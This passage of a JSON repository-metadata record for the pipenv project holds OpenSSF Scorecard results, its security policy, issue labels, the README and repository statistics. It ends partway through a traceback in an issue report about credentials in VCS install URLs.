                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/pypi_upload.yml:13",
                        "Info: topLevel 'contents' permission set to 'read': .github/workflows/ci.yaml:41",
                        "Info: found token with 'none' permissions: .github/workflows/pypi_upload.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ruff.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-fj7x-q9j7-g6q6 / PYSEC-2024-48",
                        "Warn: Project is vulnerable to: GHSA-3f84-rpwh-47g6",
                        "Warn: Project is vulnerable to: GHSA-9298-4cf8-g4wj",
                        "Warn: Project is vulnerable to: GHSA-jfmj-5v4g-7637",
                        "Warn: Project is vulnerable to: GHSA-248v-346w-9cwc",
                        "Warn: Project is vulnerable to: GHSA-jjg7-2v4v-x38h / PYSEC-2024-60",
                        "Warn: Project is vulnerable to: PYSEC-2023-117",
                        "Warn: Project is vulnerable to: GHSA-34jh-p97f-mpxf",
                        "Warn: Project is vulnerable to: GHSA-w596-4wvx-j9j6 / PYSEC-2022-42969",
                        "Warn: Project is vulnerable to: GHSA-9wx4-h78v-vm56",
                        "Warn: Project is vulnerable to: GHSA-cx63-2mw6-8hw5"
                    ],
                    "score": 0,
                    "reason": "11 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pypa/pipenv/contents/SECURITY.md",
        "SecurityPolicy_content": "## Security contact information\n\nTo report a security vulnerability, please use the\n[Tidelift security contact](https://tidelift.com/security).\nTidelift will coordinate the fix and disclosure.\n",
        "project_all_labels": [
            "--keep-outdated/--selective-upgrade",
            "--system flag",
            "ai-triaged",
            "Category: CLI",
            "Category: Dependency Resolution",
            "Category: Development",
            "Category: Docker",
            "Category: Encoding",
            "Category: Error Handling",
            "Category: Future",
            "Category: Homebrew",
            "Category: Performance",
            "Category: Pip",
            "Category: Private PyPIs :sunglasses:",
            "Category: Requirement",
            "Category: Security",
            "Category: Tests",
            "Category: VCS",
            "Contributor Candidate",
            "dev constraints",
            "DO NOT MERGE",
            "good first issue",
            "hacktoberfest",
            "hacktoberfest-accepted",
            "help wanted",
            "invalid",
            "keyrings",
            "markers",
            "multi-platform",
            "OS: Linux",
            "OS: MacOS",
            "OS: Raspberry Pi",
            "OS: Windows",
            "pip.conf",
            "PR: awaiting-merge",
            "PR: awaiting-news",
            "PR: awaiting-review",
            "PR: merged",
            "PR: reviewed",
            "Priority: Critical",
            "Priority: High",
            "Priority: Low",
            "Priority: Medium",
            "Python 2",
            "question",
            "reported bug",
            "requirementslib",
            "rltt",
            "Root cause found",
            "rotten",
            "Status: Accepted :heavy_check_mark:",
            "Status: Awaiting Review",
            "Status: Awaiting Update :hourglass_flowing_sand:",
            "Status: Awaiting Upstream",
            "Status: Changes Requested",
            "Status: Deferred / On Hold :stop_sign:",
            "Status: In Progress",
            "Status: Needs More Information",
            "Status: Rebase Required",
            "Status: Rejected :heavy_multiplication_x:",
            "Status: Requires Approval",
            "Status: Requires PEEP",
            "Status: To Be Released",
            "Status: Won't Fix",
            "Status: Workarounded",
            "triage",
            "Type: API Change",
            "Type: Behavior Change",
            "Type: Bug :bug:",
            "Type: Bugfix",
            "Type: Discussion",
            "Type: Documentation :book:",
            "Type: Duplicate",
            "Type: Enhancement :bulb:",
            "Type: Maintenance :construction:",
            "Type: Possible Bug",
            "Type: Question :grey_question:",
            "Type: Regression",
            "Type: Release Blocker",
            "Type: Vendored Dependencies",
            "validation",
            "Waiting for feedback",
            "Windows"
        ],
        "README_content": "Pipenv: Python Development Workflow for Humans\n==============================================\n\n[![image](https://img.shields.io/pypi/v/pipenv.svg)](https://python.org/pypi/pipenv)\n[![image](https://img.shields.io/pypi/l/pipenv.svg)](https://python.org/pypi/pipenv)\n[![CI](https://github.com/pypa/pipenv/actions/workflows/ci.yaml/badge.svg)](https://github.com/pypa/pipenv/actions/workflows/ci.yaml)\n[![image](https://img.shields.io/pypi/pyversions/pipenv.svg)](https://python.org/pypi/pipenv)\n\n------------------------------------------------------------------------\n\n**Pipenv** is a Python virtualenv management tool that supports a multitude of systems and nicely bridges the gaps between pip, python (using system python, pyenv or asdf) and virtualenv.\n*Linux, macOS, and Windows are all first-class citizens in pipenv.*\n\nPipenv automatically creates and manages a virtualenv for your projects, as well as adds/removes packages from your `Pipfile` as you install/uninstall packages. It also generates a project `Pipfile.lock`, which is used to produce deterministic builds.\n\nPipenv is primarily meant to provide users and developers of applications with an easy method to arrive at a consistent working project environment.\n\nThe problems that Pipenv seeks to solve are multi-faceted:\n\n- You no longer need to use `pip` and `virtualenv` separately: they work together.\n- Managing a `requirements.txt` file with package hashes can be problematic.  Pipenv uses `Pipfile` and `Pipfile.lock` to separate abstract dependency declarations from the last tested combination.\n- Hashes are documented in the lock file which are verified during install. Security considerations are put first.\n- Strongly encourage the use of the latest versions of dependencies to minimize security risks [arising from outdated components](https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities).\n- Gives you insight into your dependency graph (e.g. `$ pipenv graph`).\n- Streamline development workflow by supporting local customizations with `.env` files.\n\nTable Of Contents\n------------------\n\n- [Pipenv](#pipenv-python-development-workflow-for-humans)\n\n- [Installation](#installation)\n\n- [Features](#features)\n\n- [Basic Concepts](#basic-concepts)\n\n- [Other Commands](#other-commands)\n\n- [Shell Completion](#shell-completion)\n\n- [Usage](#usage)\n\n    - [Usage Examples](#usage-examples)\n\n    - [Commands](#commands)\n\n    - [Locate the Project](#locate-the-project)\n\n    - [Locate the virtualenv](#locate-the-virtualenv)\n\n    - [Locate the Python Interpreter](#locate-the-python-interpreter)\n\n    - [Install Packages](#install-packages)\n\n    - [Installing from git](#installing-from-git)\n\n    - [Install a dev dependency](#install-a-dev-dependency)\n\n    - [Show a dependency graph](#show-a-dependency-graph)\n\n    - [Generate a lockfile](#generate-a-lockfile)\n\n    - [Install all dev dependencies](#install-all-dev-dependencies)\n\n    - [Uninstall everything](#uninstall-everything)\n\n    - [Use the shell](#use-the-shell)\n\n- [Documentation](#documentation)\n\nInstallation\n------------\n\n**Pipenv can be installed with Python 3.7 and above.**\n\nFor most users, we recommend installing Pipenv using `pip`:\n\n    pip install --user pipenv\n\nOr, if you\\'re using FreeBSD:\n\n    pkg install py39-pipenv\n\nOr, if you\\'re using Gentoo:\n\n    sudo emerge pipenv\n\nOr, if you\\'re using Void Linux:\n\n    sudo xbps-install -S python3-pipenv\n\nAlternatively, some users prefer to use [Pipx](https://pypi.org/p/pipx):\n\n    pipx install pipenv\n\nOr, some users prefer to use Python pip module\n\n    python -m pip install pipenv\n\nRefer to the [documentation](https://pipenv.pypa.io/en/latest/#install-pipenv-today) for latest instructions.\n\n✨🍰✨\n\nFeatures\n----------\n\n-   Enables truly *deterministic builds*, while easily specifying *only\n    what you want*.\n-   Generates and checks file hashes for locked dependencies.\n-   Automatically install required Pythons, if `pyenv` or `asdf` is available.\n-   Automatically finds your project home, recursively, by looking for a\n    `Pipfile`.\n-   Automatically generates a `Pipfile`, if one doesn\\'t exist.\n-   Automatically creates a virtualenv in a standard location.\n-   Automatically adds/removes packages to a `Pipfile` when they are installed/uninstalled.\n-   Automatically loads `.env` files, if they exist.\n\nFor command reference, see [Commands](https://pipenv.pypa.io/en/latest/commands/).\n\n### Basic Concepts\n\n-   A virtualenv will automatically be created, when one doesn\\'t exist.\n-   When no parameters are passed to `install`, all packages\n    `[packages]` specified will be installed.\n-   Otherwise, whatever virtualenv defaults to will be the default.\n\n\n### Shell Completion\n\nTo enable completion in fish, add this to your configuration `~/.config/fish/completions/pipenv.fish`:\n\n    eval (env _PIPENV_COMPLETE=fish_source pipenv)\n\nThere is also a [fish plugin](https://github.com/fisherman/pipenv), which will automatically\nactivate your subshells for you!\n\nAlternatively, with zsh, add this to your configuration `~/.zshrc`:\n\n    eval \"$(_PIPENV_COMPLETE=zsh_source pipenv)\"\n\nAlternatively, with bash, add this to your configuration `~/.bashrc` or `~/.bash_profile`:\n\n    eval \"$(_PIPENV_COMPLETE=bash_source pipenv)\"\n\nMagic shell completions are now enabled!\n\nUsage\n-------\n\n    $ pipenv --help\n    Usage: pipenv [OPTIONS] COMMAND [ARGS]...\n\n    Options:\n      --where                         Output project home information.\n      --venv                          Output virtualenv information.\n      --py                            Output Python interpreter information.\n      --envs                          Output Environment Variable options.\n      --rm                            Remove the virtualenv.\n      --bare                          Minimal output.\n      --man                           Display manpage.\n      --support                       Output diagnostic information for use in\n                                      GitHub issues.\n      --site-packages / --no-site-packages\n                                      Enable site-packages for the virtualenv.\n                                      [env var: PIPENV_SITE_PACKAGES]\n      --python TEXT                   Specify which version of Python virtualenv\n                                      should use.\n      --clear                         Clears caches (pipenv, pip).  [env var:\n                                      PIPENV_CLEAR]\n      -q, --quiet                     Quiet mode.\n      -v, --verbose                   Verbose mode.\n      --pypi-mirror TEXT              Specify a PyPI mirror.\n      --version                       Show the version and exit.\n      -h, --help                      Show this message and exit.\n\n\n   ### Usage Examples:\n\n      Create a new project using Python 3.7, specifically:\n      $ pipenv --python 3.7\n\n      Remove project virtualenv (inferred from current directory):\n      $ pipenv --rm\n\n      Install all dependencies for a project (including dev):\n      $ pipenv install --dev\n\n      Create a lockfile containing pre-releases:\n      $ pipenv lock --pre\n\n      Show a graph of your installed dependencies:\n      $ pipenv graph\n\n      Check your installed dependencies for security vulnerabilities:\n      $ pipenv check\n\n      Install a local setup.py into your virtual environment/Pipfile:\n      $ pipenv install -e .\n\n      Use a lower-level pip command:\n      $ pipenv run pip freeze\n\n   ### Commands:\n\n      check         Checks for PyUp Safety security vulnerabilities and against\n                    PEP 508 markers provided in Pipfile.\n      clean         Uninstalls all packages not specified in Pipfile.lock.\n      graph         Displays currently-installed dependency graph information.\n      install       Installs provided packages and adds them to Pipfile, or (if no\n                    packages are given), installs all packages from Pipfile.\n      lock          Generates Pipfile.lock.\n      open          View a given module in your editor.\n      requirements  Generate a requirements.txt from Pipfile.lock.\n      run           Spawns a command installed into the virtualenv.\n      scripts       Lists scripts in current environment config.\n      shell         Spawns a shell within the virtualenv.\n      sync          Installs all packages specified in Pipfile.lock.\n      uninstall     Uninstalls a provided package and removes it from Pipfile.\n      update        Runs lock, then sync.\n      upgrade       Update the lock of the specified dependency / sub-dependency,\n                    but does not actually install the packages.\n      verify        Verify the hash in Pipfile.lock is up-to-date.\n\n\n### Locate the project:\n\n    $ pipenv --where\n    /Users/kennethreitz/Library/Mobile Documents/com~apple~CloudDocs/repos/kr/pipenv/test\n\n### Locate the virtualenv:\n\n    $ pipenv --venv\n    /Users/kennethreitz/.local/share/virtualenvs/test-Skyy4vre\n\n### Locate the Python interpreter:\n\n    $ pipenv --py\n    /Users/kennethreitz/.local/share/virtualenvs/test-Skyy4vre/bin/python\n\n### Install packages:\n\n    $ pipenv install\n    Creating a virtualenv for this project...\n    ...\n    No package provided, installing all dependencies.\n    Virtualenv location: /Users/kennethreitz/.local/share/virtualenvs/test-EJkjoYts\n    Installing dependencies from Pipfile.lock...\n    ...\n\n    To activate this project's virtualenv, run the following:\n    $ pipenv shell\n\n### Installing from git:\n\nYou can install packages with pipenv from git and other version control systems using URLs formatted according to the following rule:\n\n    <vcs_type>+<scheme>://<location>/<user_or_organization>/<repository>@<branch_or_tag>#<package_name>\n\nThe only optional section is the `@<branch_or_tag>` section.  When using git over SSH, you may use the shorthand vcs and scheme alias `git+git@<location>:<user_or_organization>/<repository>@<branch_or_tag>#<package_name>`. Note that this is translated to `git+ssh://git@<location>` when parsed.\n\nValid values for `<vcs_type>` include `git`, `bzr`, `svn`, and `hg`.  Valid values for `<scheme>` include `http,`, `https`, `ssh`, and `file`.  In specific cases you also have access to other schemes: `svn` may be combined with `svn` as a scheme, and `bzr` can be combined with `sftp` and `lp`.\n\nNote that it is **strongly recommended** that you install any version-controlled dependencies in editable mode, using `pipenv install -e`, in order to ensure that dependency resolution can be performed with an up to date copy of the repository each time it is performed, and that it includes all known dependencies.\n\nBelow is an example usage which installs the git repository located at `https://github.com/requests/requests.git` from tag `v2.19.1` as package name `requests`:\n\n    $ pipenv install -e git+https://github.com/requests/requests.git@v2.19#egg=requests\n    Creating a Pipfile for this project...\n    Installing -e git+https://github.com/requests/requests.git@v2.19.1#egg=requests...\n    [...snipped...]\n    Adding -e git+https://github.com/requests/requests.git@v2.19.1#egg=requests to Pipfile's [packages]...\n    [...]\n\nYou can read more about [pip's implementation of vcs support here](https://pip.pypa.io/en/stable/topics/vcs-support/).\n\n### Install a dev dependency:\n\n    $ pipenv install pytest --dev\n    Installing pytest...\n    ...\n    Adding pytest to Pipfile's [dev-packages]...\n\n### Show a dependency graph:\n\n    $ pipenv graph\n    requests==2.18.4\n      - certifi [required: >=2017.4.17, installed: 2017.7.27.1]\n      - chardet [required: >=3.0.2,<3.1.0, installed: 3.0.4]\n      - idna [required: >=2.5,<2.7, installed: 2.6]\n      - urllib3 [required: <1.23,>=1.21.1, installed: 1.22]\n\n### Generate a lockfile:\n\n    $ pipenv lock\n    Assuring all dependencies from Pipfile are installed...\n    Locking [dev-packages] dependencies...\n    Locking [packages] dependencies...\n    Note: your project now has only default [packages] installed.\n    To install [dev-packages], run: $ pipenv install --dev\n\n### Install all dev dependencies:\n\n    $ pipenv install --dev\n    Pipfile found at /Users/kennethreitz/repos/kr/pip2/test/Pipfile. Considering this to be the project home.\n    Pipfile.lock out of date, updating...\n    Assuring all dependencies from Pipfile are installed...\n    Locking [dev-packages] dependencies...\n    Locking [packages] dependencies...\n\n### Uninstall everything:\n\n    $ pipenv uninstall --all\n    No package provided, un-installing all dependencies.\n    Found 25 installed package(s), purging...\n    ...\n    Environment now purged and fresh!\n\n### Use the shell:\n\n    $ pipenv shell\n    Loading .env environment variables...\n    Launching subshell in virtual environment. Type 'exit' or 'Ctrl+D' to return.\n    $ ▯\n\n\n### PURPOSE AND ADVANTAGES OF PIPENV\n\nTo understand the problems that Pipenv solves, it's useful to show how Python package management has evolved.\n\nTake yourself back to the first Python iteration. We had Python, but there was no clean way to install packages.\n\nThen came Easy Install, a package that installs other Python packages with relative ease. But it came with a catch: it wasn't easy to uninstall packages that were no longer needed.\n\nEnter pip, which most Python users are familiar with. pip lets us install and uninstall packages. We could specify versions, run pip freeze > requirements.txt to output a list of installed packages to a text file, and use that same text file to install everything an app needed with pip install -r requirements.txt.\n\nBut pip didn't include a way to isolate packages from each other. We might work on apps that use different versions of the same libraries, so we needed a way to enable that.\n\n\nPipenv aims to solve several problems.\nFirst, the problem of needing the pip library for package installation, plus a library for creating a virtual environment, plus a library for managing virtual environments, plus all the commands associated with those libraries. That's a lot to manage. Pipenv ships with package management and virtual environment support, so you can use one tool to install, uninstall, track, and document your dependencies and to create, use, and organize your virtual environments. When you start a project with it, Pipenv will automatically create a virtual environment for that project if you aren't already using one.\n\nPipenv accomplishes this dependency management by abandoning the requirements.txt norm and trading it for a new document called a Pipfile. When you install a library with Pipenv, a Pipfile for your project is automatically updated with the details of that installation, including version information and possibly the Git repository location, file path, and other information.\n\nSecond, Pipenv wants to make it easier to manage complex interdependencies.\n\nUsing Pipenv, which gives you Pipfile, lets you avoid these problems by managing dependencies for different environments for you. This command will install the main project dependencies:\n\n pipenv install\n\nAdding the --dev tag will install the dev/testing requirements:\n\n pipenv install --dev\nTo generate a Pipfile.lock file, run:\n\npipenv lock\n\nYou can also run Python scripts with Pipenv. To run a top-level Python script called hello.py, run:\n\npipenv run python hello.py\n\nAnd you will see your expected result in the console.\n\nTo start a shell, run:\n\npipenv shell\n\nIf you would like to convert a project that currently uses a requirements.txt file to use Pipenv, install Pipenv and run:\n\npipenv install requirements.txt\n\nThis will create a Pipfile and install the specified requirements.\n\n\nDocumentation\n---------------\n\nDocumentation resides over at [pipenv.pypa.io](https://pipenv.pypa.io/en/latest/).\n\n## Star History\n\n<a href=\"https://star-history.com/#pypa/pipenv&Date\">\n  <picture>\n    <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://api.star-history.com/svg?repos=pypa/pipenv&type=Date&theme=dark\" />\n    <source media=\"(prefers-color-scheme: light)\" srcset=\"https://api.star-history.com/svg?repos=pypa/pipenv&type=Date\" />\n    <img alt=\"Star History Chart\" src=\"https://api.star-history.com/svg?repos=pypa/pipenv&type=Date\" />\n  </picture>\n</a>\n",
        "num_commits": 8992,
        "project_age_days": 2840,
        "project_created_at": "2017-01-20",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-30",
        "num_contributors": 399,
        "num_pull": 1948,
        "num_issues": 6201,
        "num_opening_issue": 227,
        "project_size(kB)": 255968,
        "num_stargazers": 24865,
        "num_watchers": 24865,
        "num_forks": 1865,
        "num_subscribers": 360,
        "SecurityPolicy_created_at": "2024-07-30 11:22:42",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "344fb8fa89b841471ea14f0164a85d3a6d0216bc",
                "url": "https://github.com/pypa/pipenv/commit/344fb8fa89b841471ea14f0164a85d3a6d0216bc",
                "date": "2024-07-30 11:22:42"
            }
        ],
        "project_security_labels": [
            "Category: Security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/pypa/pipenv/issues/6195",
                "title": "VCS install using https credentials in env variables fails for Pipfile",
                "labels": [
                    "Category: Security",
                    "triage",
                    "Contributor Candidate",
                    "ai-triaged"
                ],
                "user": "dennisvang",
                "issue_author_association": "NONE",
                "number": 6195,
                "id": 2398332965,
                "state": "closed",
                "project_created_at": "2024-07-09T14:07:53Z",
                "closed_at": "2024-10-26T03:07:03Z",
                "body": "### Issue description\r\n\r\nTrying to install a package over https, from a *private* AWS CodeCommit repo, on an Ubuntu system.\r\n\r\nInstead of using git `credential.helper`, we would like to [inject credentials into our Pipfile using env variables][2].\r\n\r\nSo, in a bash terminal, we define `USERNAME` and `PASSWORD` (url-encoded).\r\n\r\nInstalling into an empty dir, directly from the *command line*, using these credentials, *appears* to work without issue:\r\n\r\n```bash\r\npipenv install -e \"git+https://${USERNAME}:${PASSWORD}@git-codecommit.eu-west-3.amazonaws.com/v1/repos/mypackage@main#egg=mypackage\"\r\n```\r\nThis implies that the credentials and user permissions are correct.\r\n\r\nHowever, it turns out the username ***and password*** end up in both `Pipfile` and `Pipfile.lock`... \r\n\r\nThat does not sound like a good idea.\r\n\r\nLuckily, the docs for [Injecting credentials into Pipfile via environment variables][4] say:\r\n\r\n>Keep in mind that environment variables are expanded in runtime, leaving the entries in `Pipfile` or `Pipfile.lock` untouched. This is to avoid the accidental leakage of credentials in the source code.\r\n\r\nHowever, if we try to install from a `Pipfile` into an otherwise empty dir, using the exact same url with same `USERNAME` and `PASSWORD`, we get a status `403` (`Forbidden`):\r\n\r\n```toml\r\n# ...\r\n[packages]\r\nmypackage = {editable = true, ref = \"main\", git = \"git+https://${USERNAME}:${PASSWORD}@git-codecommit.eu-west-3.amazonaws.com/v1/repos/mypackage\"}\r\n# ...\r\n```\r\n\r\nyields\r\n```none\r\n...\r\nINFO:pip.subprocessor:fatal: unable to access 'https://git-codecommit.eu-west-3.amazonaws.com/v1/repos/mypackage/': \r\nThe requested URL returned error: 403\r\nERROR:pip.subprocessor:git clone --filter=blob:none --quiet 'https://myusername:****@git-codecommit.eu-west-3.amazonaws.com/v1/repos/mypackage' /tmp/pip-temp-5vfi10zn/mypackage_c61911349e2c4296b14b1168cf062f21\r\nexited with 128\r\n...\r\n```\r\n\r\n\r\n### Expected result\r\n\r\nI expect installation from `Pipfile` to work without issue, just like installation from the command line.\r\n\r\n### Actual result\r\n\r\n<details><summary>command line output</summary>\r\n\r\n```none\r\n/tmp/pipenvtest $ pipenv install --verbose\r\nPipfile.lock not found, creating...\r\nLocking [packages] dependencies...\r\nBuilding requirements...\r\nResolving dependencies...\r\nINFO:pipenv.patched.pip._internal.operations.prepare:Collecting mypackage@ \r\ngit+https://myusername:****@git-codecommit.eu-west-3.a\r\nmazonaws.com/v1/repos/mypackage@main (from -r \r\n/tmp/pipenv-2_t8zu99-requirements/pipenv-3cdgwj18-constraints.txt (line 2))\r\nINFO:pipenv.patched.pip._internal.vcs.git:Cloning \r\nhttps://myusername:****@git-codecommit.eu-west-3.amazo\r\nnaws.com/v1/repos/mypackage (to revision main) to \r\n/tmp/pip-temp-5vfi10zn/mypackage_c61911349e2c4296b14b1168cf062f21\r\nINFO:pip.subprocessor:Running command git clone --filter=blob:none --quiet \r\n'https://myusername:****@git-codecommit.eu-west-3.amaz\r\nonaws.com/v1/repos/mypackage' \r\n/tmp/pip-temp-5vfi10zn/mypackage_c61911349e2c4296b14b1168cf062f21\r\nINFO:pip.subprocessor:fatal: unable to access \r\n'https://git-codecommit.eu-west-3.amazonaws.com/v1/repos/mypackage/': The \r\nrequested URL returned error: 403\r\nERROR:pip.subprocessor:git clone --filter=blob:none --quiet \r\n'https://myusername:****@git-codecommit.eu-west-3.amaz\r\nonaws.com/v1/repos/mypackage' \r\n/tmp/pip-temp-5vfi10zn/mypackage_c61911349e2c4296b14b1168cf062f21 exited with \r\n128\r\nTraceback (most recent call last):\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/utils/resolver.py\",\r\nline 455, in resolve\r\n    results = resolver.resolve(constraints, check_supported_wheels=False)\r\n              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/resolver.py\", line 76, in resolve\r\n    collected = self.factory.collect_root_requirements(root_reqs)\r\n                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/factory.py\", line 534, in collect_root_requirements\r\n    reqs = list(\r\n           ^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/factory.py\", line 490, in _make_requirements_from_install_req\r\n    cand = self._make_base_candidate_from_link(\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/factory.py\", line 228, in _make_base_candidate_from_link\r\n    self._link_candidate_cache = LinkCandidate(\r\n                                       ^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/candidates.py\", line 294, in __init__\r\n    super().__init__(\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/candidates.py\", line 157, in __init__\r\n    self.dist = self._prepare()\r\n                ^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/candidates.py\", line 223, in _prepare\r\n    dist = self._prepare_distribution()\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/reso\r\nlution/resolvelib/candidates.py\", line 305, in _prepare_distribution\r\n    return preparer.prepare_linked_requirement(self._ireq, parallel_builds=True)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/oper\r\nations/prepare.py\", line 525, in prepare_linked_requirement\r\n    return self._prepare_linked_requirement(req, parallel_builds)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/oper\r\nations/prepare.py\", line 596, in _prepare_linked_requirement\r\n    local_file = unpack_url(\r\n                 ^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/oper\r\nations/prepare.py\", line 157, in unpack_url\r\n    unpack_vcs_link(link, location, verbosity=verbosity)\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/oper\r\nations/prepare.py\", line 80, in unpack_vcs_link\r\n    vcs_backend.unpack(location, url=hide_url(link.url), verbosity=verbosity)\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/vcs/\r\nversioncontrol.py\", line 608, in unpack\r\n    self.obtain(location, url=url, verbosity=verbosity)\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/vcs/\r\nversioncontrol.py\", line 521, in obtain\r\n    self.fetch_new(dest, url, rev_options, verbosity=verbosity)\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/vcs/\r\ngit.py\", line 276, in fetch_new\r\n    self.run_command(\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/vcs/\r\nversioncontrol.py\", line 650, in run_command\r\n    return call_subprocess(\r\n           ^^^^^^^^^^^^^^^^\r\n  File \r\n\"/home/me/.local/lib/python3.11/site-packages/pipenv/patched/pip/_internal/util\r\ns/subprocess.py\", line 224, in call_subprocess\r\n    raise error\r\npipenv.patched.pip._internal.exceptions.InstallationSubprocessError: git clone \r\n--filter=blob:none --quiet \r\n'https://myusername:****@git-codecommit.eu-west-3.amaz\r\nonaws.com/v1/repos/mypackage' \r\n/tmp/pip-temp-5vfi10zn/mypackage_c61911349e2c4296b14b1168cf062f21 exited with \r\n128\r\nDuring handling of the above exception, another exception occurred:\r\nTraceback (most recent call last):\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/resolver.py\", line \r\n675, in <module>\r\n    main()\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/resolver.py\", line \r\n661, in main\r\n    _main(\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/resolver.py\", line \r\n645, in _main\r\n    resolve_packages(\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/resolver.py\", line \r\n612, in resolve_packages\r\n    results, resolver = resolve(\r\n                        ^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/resolver.py\", line \r\n592, in resolve\r\n    return resolve_deps(\r\n           ^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/utils/resolver.py\",\r\nline 932, in resolve_deps\r\n    results, hashes, internal_resolver = actually_resolve_deps(\r\n                                         ^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/utils/resolver.py\",\r\nline 700, in actually_resolve_deps\r\n    resolver.resolve()\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/utils/resolver.py\",\r\nline 457, in resolve\r\n    raise ResolutionFailure(message=str(e))\r\npipenv.exceptions.ResolutionFailure: [31m[1mERROR[0m: [33mgit clone \r\n--filter=blob:none --quiet \r\n'https://myusername:****@git-codecommit.eu-west-3.amaz\r\nonaws.com/v1/repos/mypackage' \r\n/tmp/pip-temp-5vfi10zn/mypackage_c61911349e2c4296b14b1168cf062f21 exited with \r\n128[0m\r\n✘ Locking Failed!\r\n⠋ Locking packages...\r\nTraceback (most recent call last):\r\n  File \"/home/me/.local/bin/pipenv\", line 8, in <module>\r\n    sys.exit(cli())\r\n             ^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/vendor/click/core.py\", line 1157, in __call__\r\n    return self.main(*args, **kwargs)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/cli/options.py\", line 58, in main\r\n    return super().main(*args, **kwargs, windows_expand_args=False)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/vendor/click/core.py\", line 1078, in main\r\n    rv = self.invoke(ctx)\r\n         ^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/vendor/click/core.py\", line 1688, in invoke\r\n    return _process_result(sub_ctx.command.invoke(sub_ctx))\r\n                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/vendor/click/core.py\", line 1434, in invoke\r\n    return ctx.invoke(self.callback, **ctx.params)\r\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\r\n  File \"/home/me/.local/lib/python3.11/site-packages/pipenv/vendor/click/core.py\", line 783, in invoke\r\n    return __callback(*args, **kwargs)\r\n           